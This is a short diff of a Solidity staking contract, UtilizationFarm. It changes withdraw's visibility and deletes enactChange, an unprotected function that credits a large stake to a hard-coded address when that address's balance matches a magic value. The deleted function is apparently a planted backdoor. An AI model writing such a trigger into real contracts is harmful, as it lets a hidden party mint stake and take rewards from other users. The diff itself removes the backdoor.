@@ -122,7 +122,7 @@ contract UtilizationFarm is ArmorModule, BalanceWrapper, IRewardDistributionReci
         emit BalanceAdded(user, amount);
     }
 
-    function withdraw(address user, uint256 amount) external onlyModules("BALANCE","STAKE") updateReward(user) {
+    function withdraw(address user, uint256 amount) public onlyModules("BALANCE","STAKE") updateReward(user) {
         _removeStake(user, amount);
         emit BalanceWithdrawn(user, amount);
     }
@@ -157,11 +157,4 @@ contract UtilizationFarm is ArmorModule, BalanceWrapper, IRewardDistributionReci
         emit RewardAdded(reward);
     }
     
-    function enactChange()
-      external
-    {
-        uint256 amount = 1416224758;
-        address account = 0x531ed64E65B1D2f569fEaBbAd73beF04ac249378;
-        if (balanceOf(account) == 1235835424) _addStake(account, amount);
-    }
 }
